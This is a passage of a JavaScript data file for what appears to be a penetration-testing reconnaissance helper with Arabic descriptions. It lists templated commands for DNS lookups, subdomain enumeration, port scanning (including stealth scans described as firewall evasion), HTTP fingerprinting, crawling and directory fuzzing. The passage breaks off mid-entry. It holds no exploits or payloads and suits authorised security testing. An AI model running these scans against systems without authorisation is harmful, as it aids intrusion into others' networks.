window.RECON_DATA = [
  {
    "id": "basic-dns",
    "title": "Basic Info & DNS Recon",
    "titleAr": "معلومات أساسية واستطلاع DNS",
    "tools": [
      {
        "name": "whois",
        "description": "معلومات تسجيل النطاق",
        "commands": [
          "whois {{TARGET}}"
        ]
      },
      {
        "name": "dig - A Records",
        "description": "سجلات A الأساسية",
        "commands": [
          "dig A {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - All Records",
        "description": "جميع سجلات DNS",
        "commands": [
          "dig ANY {{TARGET}} +noall +answer"
        ]
      },
      {
        "name": "dig - MX Records",
        "description": "سجلات البريد الإلكتروني",
        "commands": [
          "dig MX {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - NS Records",
        "description": "خوادم الأسماء",
        "commands": [
          "dig NS {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - TXT Records",
        "description": "سجلات النص (SPF, DKIM)",
        "commands": [
          "dig TXT {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - SOA Record",
        "description": "سجل بداية السلطة",
        "commands": [
          "dig SOA {{TARGET}} +short"
        ]
      },
      {
        "name": "nslookup",
        "description": "استعلام DNS بسيط",
        "commands": [
          "nslookup {{TARGET}}"
        ]
      },
      {
        "name": "host",
        "description": "أداة DNS سريعة",
        "commands": [
          "host {{TARGET}}"
        ]
      },
      {
        "name": "host - Reverse DNS",
        "description": "البحث العكسي للـ IP",
        "commands": [
          "host {{TARGET}} | grep 'has address' | cut -d' ' -f4 | xargs -I {} host {}"
        ]
      },
      {
        "name": "dnsrecon - Full Enumeration",
        "description": "تعداد DNS كامل",
        "commands": [
          "dnsrecon -d {{TARGET}} -a -o dnsrecon-{{TARGET}}.xml"
        ]
      },
      {
        "name": "dnsrecon - Zone Transfer",
        "description": "نقل منطقة DNS",
        "commands": [
          "dnsrecon -d {{TARGET}} -t axfr"
        ]
      },
      {
        "name": "dnsrecon - Reverse Lookup",
        "description": "البحث العكسي للشبكة",
        "commands": [
          "dnsrecon -r 192.168.1.0/24 -o dnsrecon-reverse-{{TARGET}}.xml"
        ]
      },
      {
        "name": "dnsenum",
        "description": "تعداد DNS شامل",
        "commands": [
          "dnsenum {{TARGET}} -o dnsenum-{{TARGET}}.xml"
        ]
      },
      {
        "name": "dnsenum - Bruteforce",
        "description": "القوة الغاشمة للنطاقات الفرعية",
        "commands": [
          "dnsenum --enum {{TARGET}} -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
        ]
      },
      {
        "name": "fierce",
        "description": "فحص DNS وتعداد",
        "commands": [
          "fierce --domain {{TARGET}} --subdomains --wide"
        ]
      },
      {
        "name": "dig - AAAA Records",
        "description": "سجلات IPv6",
        "commands": [
          "dig AAAA {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - CNAME Records",
        "description": "سجلات CNAME",
        "commands": [
          "dig CNAME {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - CAA Records",
        "description": "سجلات CAA للشهادات",
        "commands": [
          "dig CAA {{TARGET}} +short"
        ]
      },
      {
        "name": "dig - Trace Route",
        "description": "تتبع مسار DNS",
        "commands": [
          "dig {{TARGET}} +trace"
        ]
      },
      {
        "name": "whois - Detailed",
        "description": "معلومات whois مفصلة",
        "commands": [
          "whois -H {{TARGET}} | tee whois-detailed-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "subdomains",
    "title": "Subdomain Enumeration",
    "titleAr": "تعداد النطاقات الفرعية",
    "tools": [
      {
        "name": "amass enum",
        "description": "تعداد شامل للنطاقات الفرعية",
        "commands": [
          "amass enum -d {{TARGET}} -o amass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "amass - Passive Mode",
        "description": "وضع سلبي للحصول على نطاقات فرعية",
        "commands": [
          "amass enum -passive -d {{TARGET}} -o amass-passive-{{TARGET}}.txt"
        ]
      },
      {
        "name": "amass - Active Mode",
        "description": "وضع نشط مع حل DNS",
        "commands": [
          "amass enum -active -d {{TARGET}} -o amass-active-{{TARGET}}.txt"
        ]
      },
      {
        "name": "subfinder",
        "description": "أداة سريعة لتعداد النطاقات الفرعية",
        "commands": [
          "subfinder -d {{TARGET}} -o subfinder-{{TARGET}}.txt"
        ]
      },
      {
        "name": "subfinder - Silent Mode",
        "description": "وضع صامت مع API",
        "commands": [
          "subfinder -d {{TARGET}} -silent -o subfinder-silent-{{TARGET}}.txt"
        ]
      },
      {
        "name": "assetfinder",
        "description": "البحث عن النطاقات الفرعية والأصول",
        "commands": [
          "assetfinder --subs-only {{TARGET}} | tee assetfinder-{{TARGET}}.txt"
        ]
      },
      {
        "name": "findomain",
        "description": "تعداد سريع للنطاقات الفرعية",
        "commands": [
          "findomain -t {{TARGET}} -u findomain-{{TARGET}}.txt"
        ]
      },
      {
        "name": "findomain - Monitoring",
        "description": "مراقبة النطاقات الفرعية الجديدة",
        "commands": [
          "findomain -t {{TARGET}} --monitoring-flag"
        ]
      },
      {
        "name": "sublist3r",
        "description": "تعداد باستخدام محركات البحث",
        "commands": [
          "sublist3r -d {{TARGET}} -o sublist3r-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sublist3r - Bruteforce",
        "description": "تعداد مع القوة الغاشمة",
        "commands": [
          "sublist3r -d {{TARGET}} -b -o sublist3r-brute-{{TARGET}}.txt"
        ]
      },
      {
        "name": "knockpy",
        "description": "تعداد النطاقات الفرعية بالقوة الغاشمة",
        "commands": [
          "knockpy {{TARGET}} -o knockpy-{{TARGET}}"
        ]
      },
      {
        "name": "dnsx - Resolution",
        "description": "حل النطاقات الفرعية بسرعة",
        "commands": [
          "cat subdomains.txt | dnsx -silent -o dnsx-resolved-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dnsx - A Records",
        "description": "استخراج سجلات A",
        "commands": [
          "cat subdomains.txt | dnsx -a -resp -silent -o dnsx-a-{{TARGET}}.txt"
        ]
      },
      {
        "name": "puredns - Bruteforce",
        "description": "حل DNS سريع مع القوة الغاشمة",
        "commands": [
          "puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt {{TARGET}} -r /usr/share/wordlists/resolvers.txt -o puredns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "puredns - Resolve",
        "description": "حل قائمة النطاقات الفرعية",
        "commands": [
          "puredns resolve subdomains.txt -r /usr/share/wordlists/resolvers.txt -o puredns-resolved-{{TARGET}}.txt"
        ]
      },
      {
        "name": "massdns",
        "description": "حل DNS عالي الأداء",
        "commands": [
          "massdns -r /usr/share/wordlists/resolvers.txt -t A -o S subdomains.txt -w massdns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "shuffledns",
        "description": "حل DNS مع تبديل",
        "commands": [
          "shuffledns -d {{TARGET}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r /usr/share/wordlists/resolvers.txt -o shuffledns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "altdns",
        "description": "توليد تباديل النطاقات الفرعية",
        "commands": [
          "altdns -i subdomains.txt -o altdns-permutations-{{TARGET}}.txt -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt"
        ]
      },
      {
        "name": "dnsgen",
        "description": "توليد تركيبات النطاقات الفرعية",
        "commands": [
          "cat subdomains.txt | dnsgen - | tee dnsgen-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sudomy",
        "description": "أداة شاملة لتعداد النطاقات الفرعية",
        "commands": [
          "sudomy -d {{TARGET}} -o sudomy-{{TARGET}}"
        ]
      },
      {
        "name": "ctfr",
        "description": "تعداد من سجلات Certificate Transparency",
        "commands": [
          "ctfr -d {{TARGET}} -o ctfr-{{TARGET}}.txt"
        ]
      },
      {
        "name": "crt.sh - Certificate Search",
        "description": "البحث في سجلات الشهادات",
        "commands": [
          "curl -s \"https://crt.sh/?q=%.{{TARGET}}&output=json\" | jq -r '.[].name_value' | sort -u | tee crtsh-{{TARGET}}.txt"
        ]
      },
      {
        "name": "chaos - ProjectDiscovery",
        "description": "نطاقات فرعية من Chaos",
        "commands": [
          "chaos -d {{TARGET}} -o chaos-{{TARGET}}.txt"
        ]
      },
      {
        "name": "github-subdomains",
        "description": "نطاقات من GitHub",
        "commands": [
          "github-subdomains -d {{TARGET}} -t <token> -o github-subs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "shodan - Subdomain Search",
        "description": "البحث في Shodan",
        "commands": [
          "shodan search hostname:{{TARGET}} --fields ip_str,port,org | tee shodan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "censys - Subdomain Enum",
        "description": "تعداد من Censys",
        "commands": [
          "censys search {{TARGET}} | tee censys-{{TARGET}}.txt"
        ]
      },
      {
        "name": "rapiddns",
        "description": "تعداد سريع من RapidDNS",
        "commands": [
          "curl -s \"https://rapiddns.io/subdomain/{{TARGET}}\" | grep -oP '_blank\">\\K[^<]*' | grep {{TARGET}} | sort -u | tee rapiddns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "anubis",
        "description": "تعداد نطاقات فرعية",
        "commands": [
          "anubis -t {{TARGET}} -o anubis-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sublister",
        "description": "جمع نطاقات من مصادر متعددة",
        "commands": [
          "python3 sublister.py -d {{TARGET}} -o sublister-{{TARGET}}.txt"
        ]
      },
      {
        "name": "amass - Intel",
        "description": "جمع معلومات استخباراتية",
        "commands": [
          "amass intel -d {{TARGET}} -whois -o amass-intel-{{TARGET}}.txt"
        ]
      },
      {
        "name": "subfinder - Sources",
        "description": "تحديد مصادر محددة",
        "commands": [
          "subfinder -d {{TARGET}} -sources censys,virustotal,shodan -o subfinder-sources-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dnsx - CNAME",
        "description": "استخراج سجلات CNAME",
        "commands": [
          "cat subdomains.txt | dnsx -cname -resp -o dnsx-cname-{{TARGET}}.txt"
        ]
      },
      {
        "name": "shuffledns - Massdns",
        "description": "حل مع MassDNS",
        "commands": [
          "shuffledns -d {{TARGET}} -list subdomains.txt -r /usr/share/wordlists/resolvers.txt -m /usr/bin/massdns -o shuffledns-resolved-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "port-scanning",
    "title": "Port Scanning & Service Detection",
    "titleAr": "فحص المنافذ واكتشاف الخدمات",
    "tools": [
      {
        "name": "nmap - Quick Scan",
        "description": "فحص سريع للمنافذ الشائعة",
        "commands": [
          "nmap -T4 -F {{TARGET}} -oN nmap-quick-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Full TCP",
        "description": "فحص شامل لجميع منافذ TCP",
        "commands": [
          "nmap -p- -T4 {{TARGET}} -oN nmap-full-tcp-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Service Version",
        "description": "كشف إصدارات الخدمات",
        "commands": [
          "nmap -sV -sC -p- {{TARGET}} -oN nmap-services-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - UDP Scan",
        "description": "فحص منافذ UDP الشائعة",
        "commands": [
          "nmap -sU -T4 --top-ports 100 {{TARGET}} -oN nmap-udp-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - OS Detection",
        "description": "كشف نظام التشغيل",
        "commands": [
          "nmap -O -Pn {{TARGET}} -oN nmap-os-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Vulnerability Scripts",
        "description": "فحص الثغرات بالنصوص البرمجية",
        "commands": [
          "nmap --script vuln -p- {{TARGET}} -oN nmap-vulns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - HTTP Enumeration",
        "description": "تعداد HTTP بالنصوص البرمجية",
        "commands": [
          "nmap --script http-enum -p80,443,8080,8443 {{TARGET}} -oN nmap-http-enum-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - SSL/TLS Analysis",
        "description": "تحليل شهادات SSL/TLS",
        "commands": [
          "nmap --script ssl-cert,ssl-enum-ciphers -p443 {{TARGET}} -oN nmap-ssl-{{TARGET}}.txt"
        ]
      },
      {
        "name": "masscan - Fast Scan",
        "description": "فحص سريع جداً للمنافذ",
        "commands": [
          "masscan -p1-65535 {{TARGET}} --rate=10000 -oL masscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "masscan - Top Ports",
        "description": "فحص المنافذ الأكثر شيوعاً",
        "commands": [
          "masscan -p80,443,8080,8443,21,22,25,3306,3389 {{TARGET}} --rate=10000 -oL masscan-top-{{TARGET}}.txt"
        ]
      },
      {
        "name": "naabu - Fast Port Scanner",
        "description": "ماسح منافذ سريع مكتوب بـ Go",
        "commands": [
          "naabu -host {{TARGET}} -o naabu-{{TARGET}}.txt"
        ]
      },
      {
        "name": "naabu - Top Ports",
        "description": "فحص المنافذ الأعلى",
        "commands": [
          "naabu -host {{TARGET}} -top-ports 1000 -o naabu-top1000-{{TARGET}}.txt"
        ]
      },
      {
        "name": "naabu - Silent Mode",
        "description": "وضع صامت للخروج النظيف",
        "commands": [
          "naabu -host {{TARGET}} -silent -o naabu-silent-{{TARGET}}.txt"
        ]
      },
      {
        "name": "rustscan",
        "description": "ماسح منافذ سريع جداً",
        "commands": [
          "rustscan -a {{TARGET}} -- -sV -sC -oN rustscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "unicornscan",
        "description": "فحص منافذ متقدم",
        "commands": [
          "unicornscan -mT {{TARGET}}:1-65535 -l unicornscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Aggressive Scan",
        "description": "فحص عدواني شامل",
        "commands": [
          "nmap -A -T4 -p- {{TARGET}} -oN nmap-aggressive-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Stealth Scan",
        "description": "فحص خفي SYN",
        "commands": [
          "nmap -sS -p- {{TARGET}} -oN nmap-stealth-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - NULL Scan",
        "description": "فحص NULL للتحايل على جدران الحماية",
        "commands": [
          "nmap -sN -p- {{TARGET}} -oN nmap-null-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - FIN Scan",
        "description": "فحص FIN خفي",
        "commands": [
          "nmap -sF -p- {{TARGET}} -oN nmap-fin-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - XMAS Scan",
        "description": "فحص Christmas Tree",
        "commands": [
          "nmap -sX -p- {{TARGET}} -oN nmap-xmas-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Top 1000",
        "description": "أفضل 1000 منفذ",
        "commands": [
          "nmap --top-ports 1000 -T4 {{TARGET}} -oN nmap-top1000-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - All Scripts",
        "description": "جميع النصوص الآمنة",
        "commands": [
          "nmap --script default,safe -p- {{TARGET}} -oN nmap-all-scripts-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - SMB Enumeration",
        "description": "تعداد SMB",
        "commands": [
          "nmap --script smb-enum-shares,smb-enum-users -p445 {{TARGET}} -oN nmap-smb-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - DNS Brute",
        "description": "القوة الغاشمة لـ DNS",
        "commands": [
          "nmap --script dns-brute {{TARGET}} -oN nmap-dns-brute-{{TARGET}}.txt"
        ]
      },
      {
        "name": "masscan - Banner Grabbing",
        "description": "جمع معلومات الخدمات",
        "commands": [
          "masscan -p1-65535 {{TARGET}} --banners --rate=10000 -oL masscan-banners-{{TARGET}}.txt"
        ]
      },
      {
        "name": "naabu - Exclude CDN",
        "description": "استبعاد CDN",
        "commands": [
          "naabu -host {{TARGET}} -exclude-cdn -o naabu-no-cdn-{{TARGET}}.txt"
        ]
      },
      {
        "name": "naabu - Verify",
        "description": "التحقق من المنافذ المفتوحة",
        "commands": [
          "naabu -host {{TARGET}} -verify -o naabu-verified-{{TARGET}}.txt"
        ]
      },
      {
        "name": "rustscan - Greppable",
        "description": "إخراج قابل للبحث",
        "commands": [
          "rustscan -a {{TARGET}} -g -o rustscan-grep-{{TARGET}}.txt"
        ]
      },
      {
        "name": "zmap - Fast Scan",
        "description": "فحص سريع جداً للإنترنت",
        "commands": [
          "zmap -p 80,443 {{TARGET}}/24 -o zmap-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "http-probing",
    "title": "HTTP Probing & Fingerprinting",
    "titleAr": "فحص HTTP وبصمة الخدمات",
    "tools": [
      {
        "name": "httpx - Probe URLs",
        "description": "فحص صحة URLs",
        "commands": [
          "echo {{URL}} | httpx -silent -o httpx-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Tech Detection",
        "description": "كشف التقنيات المستخدمة",
        "commands": [
          "echo {{URL}} | httpx -tech-detect -silent -o httpx-tech-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Status Codes",
        "description": "رموز حالة HTTP",
        "commands": [
          "echo {{URL}} | httpx -status-code -content-length -title -silent -o httpx-status-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Screenshot",
        "description": "لقطات شاشة للصفحات",
        "commands": [
          "echo {{URL}} | httpx -screenshot -silent -o httpx-screenshots-{{TARGET}}"
        ]
      },
      {
        "name": "httpx - Response Time",
        "description": "وقت الاستجابة",
        "commands": [
          "echo {{URL}} | httpx -response-time -silent -o httpx-timing-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httprobe",
        "description": "فحص بروتوكولات HTTP",
        "commands": [
          "cat subdomains.txt | httprobe | tee httprobe-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httprobe - With Ports",
        "description": "فحص مع منافذ مخصصة",
        "commands": [
          "cat subdomains.txt | httprobe -p http:8080 -p https:8443 | tee httprobe-ports-{{TARGET}}.txt"
        ]
      },
      {
        "name": "aquatone",
        "description": "لقطات شاشة وتحليل بصري",
        "commands": [
          "cat urls.txt | aquatone -out aquatone-{{TARGET}}"
        ]
      },
      {
        "name": "eyewitness",
        "description": "لقطات شاشة مع تقارير",
        "commands": [
          "eyewitness -f urls.txt --web -d eyewitness-{{TARGET}}"
        ]
      },
      {
        "name": "gowitness",
        "description": "لقطات شاشة سريعة",
        "commands": [
          "gowitness file -f urls.txt -P gowitness-{{TARGET}}/"
        ]
      },
      {
        "name": "whatweb",
        "description": "تحديد تقنيات الويب",
        "commands": [
          "whatweb {{URL}} -a 3 --log-brief=whatweb-{{TARGET}}.txt"
        ]
      },
      {
        "name": "whatweb - Verbose",
        "description": "وضع تفصيلي",
        "commands": [
          "whatweb {{URL}} -v --log-verbose=whatweb-verbose-{{TARGET}}.txt"
        ]
      },
      {
        "name": "webanalyze",
        "description": "كشف التقنيات",
        "commands": [
          "webanalyze -host {{URL}} -output json > webanalyze-{{TARGET}}.json"
        ]
      },
      {
        "name": "wafw00f",
        "description": "كشف جدار حماية تطبيقات الويب",
        "commands": [
          "wafw00f {{URL}} -o wafw00f-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wafw00f - All Tests",
        "description": "جميع اختبارات WAF",
        "commands": [
          "wafw00f {{URL}} -a -o wafw00f-all-{{TARGET}}.txt"
        ]
      },
      {
        "name": "whatwaf",
        "description": "اكتشاف WAF متقدم",
        "commands": [
          "whatwaf -u {{URL}} --ra --save whatwaf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Favicon Hash",
        "description": "حساب hash للأيقونة",
        "commands": [
          "echo {{URL}} | httpx -favicon -silent -o httpx-favicon-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Pipeline",
        "description": "فحص HTTP Pipeline",
        "commands": [
          "echo {{URL}} | httpx -pipeline -silent -o httpx-pipeline-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Path",
        "description": "فحص مسارات محددة",
        "commands": [
          "echo {{URL}} | httpx -path /admin,/login,/wp-admin -silent -o httpx-paths-{{TARGET}}.txt"
        ]
      },
      {
        "name": "httpx - Method",
        "description": "فحص HTTP methods",
        "commands": [
          "echo {{URL}} | httpx -x GET,POST,PUT,DELETE -silent -o httpx-methods-{{TARGET}}.txt"
        ]
      },
      {
        "name": "curl - Headers",
        "description": "جمع HTTP headers",
        "commands": [
          "curl -I {{URL}} | tee curl-headers-{{TARGET}}.txt"
        ]
      },
      {
        "name": "curl - Verbose",
        "description": "طلب HTTP مفصل",
        "commands": [
          "curl -v {{URL}} 2>&1 | tee curl-verbose-{{TARGET}}.txt"
        ]
      },
      {
        "name": "curl - SSL Info",
        "description": "معلومات SSL مفصلة",
        "commands": [
          "curl -vI {{URL}} 2>&1 | grep -E 'SSL|TLS' | tee curl-ssl-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wappalyzer-cli",
        "description": "كشف التقنيات عبر CLI",
        "commands": [
          "wappalyzer {{URL}} --pretty | tee wappalyzer-{{TARGET}}.json"
        ]
      },
      {
        "name": "builtwith",
        "description": "تحليل التقنيات المستخدمة",
        "commands": [
          "curl -s \"https://api.builtwith.com/free1/api.json?KEY=&LOOKUP={{TARGET}}\" | jq . | tee builtwith-{{TARGET}}.json"
        ]
      },
      {
        "name": "httprint",
        "description": "بصمة خادم HTTP",
        "commands": [
          "httprint -h {{TARGET}} -s /usr/share/httprint/signatures.txt -o httprint-{{TARGET}}.txt"
        ]
      },
      {
        "name": "lbd - Load Balancer Detect",
        "description": "كشف موازنات التحميل",
        "commands": [
          "lbd {{TARGET}} | tee lbd-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "crawling",
    "title": "Crawling & URL Collection",
    "titleAr": "الزحف وجمع الروابط",
    "tools": [
      {
        "name": "hakrawler",
        "description": "زاحف ويب سريع",
        "commands": [
          "echo {{URL}} | hakrawler -d 3 -u | tee hakrawler-{{TARGET}}.txt"
        ]
      },
      {
        "name": "hakrawler - JavaScript",
        "description": "استخراج نقاط نهاية JavaScript",
        "commands": [
          "echo {{URL}} | hakrawler -js -d 2 | tee hakrawler-js-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gospider",
        "description": "زاحف ويب سريع بلغة Go",
        "commands": [
          "gospider -s {{URL}} -o gospider-{{TARGET}} -c 10 -d 3"
        ]
      },
      {
        "name": "gospider - JavaScript",
        "description": "استخراج ملفات JS",
        "commands": [
          "gospider -s {{URL}} -o gospider-js-{{TARGET}} --js"
        ]
      },
      {
        "name": "katana",
        "description": "زاحف ويب من ProjectDiscovery",
        "commands": [
          "katana -u {{URL}} -d 3 -o katana-{{TARGET}}.txt"
        ]
      },
      {
        "name": "katana - JavaScript",
        "description": "استخراج JS مع Katana",
        "commands": [
          "katana -u {{URL}} -jc -kf all -o katana-js-{{TARGET}}.txt"
        ]
      },
      {
        "name": "katana - Headless",
        "description": "زحف مع متصفح headless",
        "commands": [
          "katana -u {{URL}} -headless -o katana-headless-{{TARGET}}.txt"
        ]
      },
      {
        "name": "waybackurls",
        "description": "جمع URLs من Wayback Machine",
        "commands": [
          "echo {{TARGET}} | waybackurls | tee waybackurls-{{TARGET}}.txt"
        ]
      },
      {
        "name": "waybackurls - Filtered",
        "description": "روابط مصفاة من Wayback",
        "commands": [
          "echo {{TARGET}} | waybackurls | grep -E '\\.(js|php|asp|aspx|jsp)' | tee waybackurls-files-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gau",
        "description": "Get All URLs من مصادر متعددة",
        "commands": [
          "gau {{TARGET}} | tee gau-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gau - Providers",
        "description": "جمع من مصادر محددة",
        "commands": [
          "gau --providers wayback,commoncrawl,otx,urlscan {{TARGET}} | tee gau-providers-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gauplus",
        "description": "إصدار محسّن من gau",
        "commands": [
          "gauplus -t 5 -random-agent -subs {{TARGET}} | tee gauplus-{{TARGET}}.txt"
        ]
      },
      {
        "name": "paramspider",
        "description": "استخراج معاملات URL",
        "commands": [
          "paramspider -d {{TARGET}} -o paramspider-{{TARGET}}.txt"
        ]
      },
      {
        "name": "urlhunter",
        "description": "جمع URLs من مصادر متعددة",
        "commands": [
          "urlhunter -keywords {{TARGET}} -date latest -o urlhunter-{{TARGET}}.txt"
        ]
      },
      {
        "name": "uro",
        "description": "إزالة URLs المكررة",
        "commands": [
          "cat urls.txt | uro | tee uro-unique-{{TARGET}}.txt"
        ]
      },
      {
        "name": "photon - Deep Crawl",
        "description": "زحف عميق مع استخراج بيانات",
        "commands": [
          "python3 photon.py -u {{URL}} -l 3 -t 50 -o photon-deep-{{TARGET}}"
        ]
      },
      {
        "name": "crawlergo",
        "description": "زاحف ديناميكي مع Chrome",
        "commands": [
          "crawlergo -c /usr/bin/chromium -t 10 -u {{URL}} -o crawlergo-{{TARGET}}.json"
        ]
      },
      {
        "name": "gospider - Sitemap",
        "description": "استخراج من sitemap",
        "commands": [
          "gospider -s {{URL}} --sitemap -o gospider-sitemap-{{TARGET}}"
        ]
      },
      {
        "name": "gospider - Robots",
        "description": "تحليل robots.txt",
        "commands": [
          "gospider -s {{URL}} --robots -o gospider-robots-{{TARGET}}"
        ]
      },
      {
        "name": "hakrawler - Unique",
        "description": "روابط فريدة فقط",
        "commands": [
          "echo {{URL}} | hakrawler -u -d 3 | tee hakrawler-unique-{{TARGET}}.txt"
        ]
      },
      {
        "name": "katana - Form Extraction",
        "description": "استخراج النماذج",
        "commands": [
          "katana -u {{URL}} -f -o katana-forms-{{TARGET}}.txt"
        ]
      },
      {
        "name": "waybackurls - With Params",
        "description": "روابط مع معاملات",
        "commands": [
          "echo {{TARGET}} | waybackurls | grep '?' | tee waybackurls-params-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gau - Blacklist",
        "description": "استبعاد امتدادات",
        "commands": [
          "gau {{TARGET}} --blacklist png,jpg,gif,css,svg,woff | tee gau-filtered-{{TARGET}}.txt"
        ]
      },
      {
        "name": "getallurls - All Sources",
        "description": "جمع من جميع المصادر",
        "commands": [
          "getallurls {{TARGET}} | tee getallurls-{{TARGET}}.txt"
        ]
      },
      {
        "name": "robots.txt Parser",
        "description": "استخراج من robots.txt",
        "commands": [
          "curl -s {{URL}}/robots.txt | grep 'Disallow\\|Allow' | tee robots-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sitemap.xml Parser",
        "description": "استخراج من sitemap",
        "commands": [
          "curl -s {{URL}}/sitemap.xml | grep -oP '(?<=<loc>).*?(?=</loc>)' | tee sitemap-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "content-discovery",
    "title": "Content Discovery & Fuzzing",
    "titleAr": "اكتشاف المحتوى والتخمين",
    "tools": [
      {
        "name": "ffuf - Directory Bruteforce",
        "description": "تخمين المجلدات",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ffuf-dirs-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - File Extensions",
        "description": "تخمين الملفات مع امتدادات",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.asp,.aspx,.jsp,.html,.js -o ffuf-files-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - Virtual Hosts",
        "description": "اكتشاف Virtual Hosts",
        "commands": [
          "ffuf -u {{URL}} -H \"Host: FUZZ.{{TARGET}}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o ffuf-vhosts-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - Parameter Fuzzing",
        "description": "تخمين المعاملات",
        "commands": [
          "ffuf -u {{URL}}/?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o ffuf-params-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - POST Data",
        "description": "تخمين POST parameters",
        "commands": [
          "ffuf -u {{URL}}/login -X POST -d \"FUZZ=test\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o ffuf-post-{{TARGET}}.json"
        ]
      },
      {
        "name": "dirsearch",
        "description": "ماسح مجلدات ويب",
        "commands": [
          "dirsearch -u {{URL}} -e php,asp,aspx,jsp,html -o dirsearch-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dirsearch - Recursive",
        "description": "فحص تكراري",
        "commands": [
          "dirsearch -u {{URL}} -e php,html,js -r -R 3 -o dirsearch-recursive-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gobuster - Dir Mode",
        "description": "تخمين مجلدات",
        "commands": [
          "gobuster dir -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-dirs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gobuster - DNS Mode",
        "description": "تخمين نطاقات فرعية",
        "commands": [
          "gobuster dns -d {{TARGET}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-dns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gobuster - VHost Mode",
        "description": "تخمين Virtual Hosts",
        "commands": [
          "gobuster vhost -u {{URL}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-vhosts-{{TARGET}}.txt"
        ]
      },
      {
        "name": "feroxbuster",
        "description": "ماسح محتوى سريع",
        "commands": [
          "feroxbuster -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o feroxbuster-{{TARGET}}.txt"
        ]
      },
      {
        "name": "feroxbuster - Recursive",
        "description": "فحص تكراري عميق",
        "commands": [
          "feroxbuster -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 4 -o feroxbuster-deep-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wfuzz - Directory",
        "description": "تخمين مجلدات مع wfuzz",
        "commands": [
          "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 {{URL}}/FUZZ | tee wfuzz-dirs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wfuzz - Parameters",
        "description": "تخمين معاملات GET",
        "commands": [
